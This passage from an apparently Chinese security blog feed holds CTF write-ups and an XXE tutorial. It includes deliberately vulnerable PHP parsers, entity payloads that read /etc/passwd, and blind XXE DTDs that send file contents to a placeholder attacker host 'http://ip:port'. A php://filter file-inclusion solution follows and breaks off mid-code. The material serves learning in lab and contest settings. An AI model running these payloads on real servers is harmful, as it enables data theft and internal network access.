class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE des[] = &#123; <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span>, <span class="number">0x1A</span>, <span class="number">0x21</span>, <span class="number">0x2A</span>, <span class="number">0x07</span>, </span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, <span class="number">0x1E</span>, <span class="number">0x0B</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x29</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> random[] = &#123;  <span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span> &#125;;</span><br><span class="line"></span><br><span class="line">BYTE s[] = &#123; <span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x48</span>,<span class="number">0x45</span>,<span class="number">0x48</span>,<span class="number">0x43</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x46</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x48</span>,<span class="number">0x48</span>,<span class="number">0x45</span>,<span class="number">0x43</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[i] ^ des[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;0x%x,&quot;, s[i]);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到<code>Thi5_iiS5_UUPX_LalAC</code>，不知道为什么多了一位<code>C</code>，删掉后用<code>HECTF</code>包裹提交就好</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>本来还准备看一下文件的，结果直接<code>nc 123.56.242.200 10005 </code>就得到了flag</p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞的学习</title>
      <link href="/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE漏洞的学习"><a href="#XXE漏洞的学习" class="headerlink" title="XXE漏洞的学习"></a>XXE漏洞的学习</h1><p>XXE：<code>XML External Entity</code> 即外部实体，从安全角度理解成 XML External Entity attack 外部实体注入攻击（那为啥不叫XEE）。对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。</p><h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p>XML是<code>可扩展标记语言</code>（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）的缩写，它是是一种数据表示格式，可以描述非常复杂的数据结构，常用于传输和存储数据。</p><p><code>语法结构</code>与 <code>HTML </code>大致相同，<code>HTML</code> 旨在显示数据信息，而 <code>XML</code> 旨在传输数据信息。（说到传输数据自然而然肯定会想到<code>json</code>格式，相比<code>XML</code>，现在用的更多是<code>json</code>格式来传输数据）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>seizer<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>ggbond<span class="tag">&lt;/<span class="name">from</span>&gt;</span>xml</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面代码中的第一行，定义XML的版本与编码。</p><p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<code>&lt;note&gt;</code>是整个文档的根元素。嵌套在note标签中的<code>&lt;to&gt;</code>和<code>&lt;from&gt;</code>则是根的子元素。</p><p>同时，所有的XML元素都必须有关闭标签，这点不像HTML语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA 和 CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p><p>网上的文章中对实体的种类个数各有不同，大致为以下几种：</p><p>内部实体 外部实体 字符实体 命名实体 参数实体</p><h2 id="文档类型定义：-DTD"><a href="#文档类型定义：-DTD" class="headerlink" title="文档类型定义： DTD"></a>文档类型定义： DTD</h2><p>XML的语言规范是由DTD（Document Type Definition）来控制，类似编程语言的语法，它定义了XML文档的合法构建模块，即声明了XML的内容格式规范。</p><p>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 dtd 文件。</p><h3 id="内部引用"><a href="#内部引用" class="headerlink" title="内部引用"></a>内部引用</h3><p>格式：</p><blockquote><!ENTITY 实体名称 "实体的值"></blockquote><p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  <span class="meta-keyword">chybeta</span>  <span class="meta-string">&quot;Hello World!&quot;</span>&gt;</span>    </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </span><br><span class="line">    <span class="symbol">&amp;chybeta;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问该XML文档，&chybeta;会被解析为Hello World!并输出。</p><h3 id="外部引用"><a href="#外部引用" class="headerlink" title="外部引用"></a>外部引用</h3><blockquote><!ENTITY 实体名称 SYSTEM "URI"></blockquote><p>通过引用定义在外部的DTD中的实体，我们称之为外部实体。 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY  <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c://123.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358016.png" alt="image-20211019222721226"></p><h2 id="XML-注入"><a href="#XML-注入" class="headerlink" title="XML 注入"></a>XML 注入</h2><p>demo：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 注入前XML代码</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;用户输入位置&lt;/USER&gt;</span></span><br></pre></td></tr></table></figure><p>当用户输入一些恶意代码，比如<code>User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2</code>，原XML代码就变成了下面的样子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 注入后XML代码</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;User1&lt;/USER&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;User2&lt;/USER&gt;</span></span><br></pre></td></tr></table></figure><p>对于普通的<code>XML注入</code>，利用面比较狭窄，所及几乎永不i到，如果有的话也应该是逻辑漏洞，下面重点介绍<code>XXE</code>的利用！</p><h1 id="XXE漏洞的利用"><a href="#XXE漏洞的利用" class="headerlink" title="XXE漏洞的利用"></a>XXE漏洞的利用</h1><p>实验环境：</p><p>windows11 + phpStudy + apache + php</p><p>PHP Version: 5.2.17</p><p>libxml Version: 2.7.7</p><h2 id="有回显读本地敏感文件（Normal-XXE）"><a href="#有回显读本地敏感文件（Normal-XXE）" class="headerlink" title="有回显读本地敏感文件（Normal XXE）"></a>有回显读本地敏感文件（Normal XXE）</h2><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$info</span> = simplexml_load_string(<span class="variable">$xmlfile</span>);</span><br><span class="line"><span class="comment">// $dom = new DOMDocument();</span></span><br><span class="line"><span class="comment">// $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="comment">// $info = simplexml_import_dom($dom);</span></span><br><span class="line">print_r((<span class="keyword">string</span>)<span class="variable">$info</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Congratulations to you!</span><br></pre></td></tr></table></figure><p>demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/202112071358017.png" alt="image-20211025212502713"></p><p>如果 <code>flag.txt</code>中包含特殊符号，比如<code>&lt;&gt;&amp;&#39;</code>等，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;XXE Congratulations to you!&gt;</span><br></pre></td></tr></table></figure><p><img src="/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/202112071358018.png" alt="image-20211026135124382"></p><p>可以看到当被读取文件中含有特殊符号时，返回了一堆错误，这个时候我们可以使用<code>CDATA</code>（还可以使用 <code>php://filter </code>进行 base64 编码进行读取）</p><blockquote><p>什么是CDATA：</p><p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p><p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p></blockquote><p>修改 demo.xml 为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;demo.dtd&quot;</span>&gt;</span> %dtd;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地添加: demo.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/202112071358019.png" alt="image-20211026140239559"></p><p>利用带有CDATA的Payload，可以看到特殊符号被成功绕过。</p><p>但是在真实情况下，服务器上的XML一般用于配置文件或者传输数据，而不是显示数据，因此在现实环境下利用这个漏洞就需要找到不依靠回显的方法。</p><h2 id="无回显读取本地敏感文件（Blind-XXE）"><a href="#无回显读取本地敏感文件（Blind-XXE）" class="headerlink" title="无回显读取本地敏感文件（Blind XXE）"></a>无回显读取本地敏感文件（Blind XXE）</h2><h3 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h3><p>靶机文件：xxe_blind.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地 payload：demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/demo.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>本地文件：demo.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在可访问的 <code>ip</code> 地址即<code>端口</code>上使用 <code>nc</code> 进行监听，从而形成攻击</p><p><img src="/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/202112071358020.png" alt="img"></p><h3 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h3><p>demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/xxe.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd; %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://ip:port/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>整个的调用过程如下：解析时<code>%dtd</code>引入xxe.xml，之后<code>%all</code>引入<code>send</code>的定义，最后引用了实体send，把<code>%file</code>文件内容通过一个http请求发了出去。注意需要把payload经过url编码。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358021.png" alt="img"></p><h1 id="BUU-XXE-COURSE-1"><a href="#BUU-XXE-COURSE-1" class="headerlink" title="BUU XXE COURSE 1"></a>BUU XXE COURSE 1</h1><p>进入页面后是一个 Login 登录页面，随便填试一下</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358022.png" alt="image-20211026142903435"></p><p>发现 login.php ，并且发现了 xml 注入点</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>回显为<code>username</code>标签，为有回显XXE</p><p>构造payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注入后获得 flag</p><p><img src="/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/202112071358023.png" alt="image-20211026143509182"></p><p><strong>PS：该文章只记录了 XXE 的入门学习，深入学习请圆详读下面参考文章</strong></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://ca01h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">Web安全学习之XXE漏洞利用</a></p><p><a href="https://ctfbook.ph0en1x.com/web/zhu-ru/xmlshi-ti-zhu-ru#ji-chu-zhi-shi">XML实体注入</a></p><p><a href="https://cloud.tencent.com/developer/article/1657188">如何在PHP中解析XML</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届西安邮电大学网络安全技能大赛</title>
      <link href="/post/2021-10/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/post/2021-10/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>第二届西安邮电大学网络安全技能大赛是我校的大型CTF比赛，本次大赛由高年级学生和西安四叶草信息技术有限公司共同供题。因比赛结束，以下解题过程均为题目复现，故不能保证完全一致，仅供参考！</p><p>复现地址：<a href="https://www.xuntctf.top/challenges">网络科技协会XuntCTF</a></p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>考点：php://filter 伪协议，pop链的构造（php魔术方法）</p><p>进入页面，直接看hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的一个文件包含漏洞，通过<a href="https://segmentfault.com/a/1190000018991087">伪协议</a>进行读取 <code>flag.php</code> 内容即可获得<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5e4a4b8e-9123-465c-8d67-314fb70a68a9.node.xuntctf.top:8080/hint.php?flag=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>将得到的 base64 密文进行解密即可！</p><p>得到<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">I<span class="string">&#x27;m not a real flag</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交！怎么不对？</p><p>（骚年，怎么可能这么简单，醒醒吧！）</p><p>读取首页 index.php 的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5e4a4b8e-9123-465c-8d67-314fb70a68a9.node.xuntctf.top:8080/hint.php?flag=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>将的到的密文解密得到如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 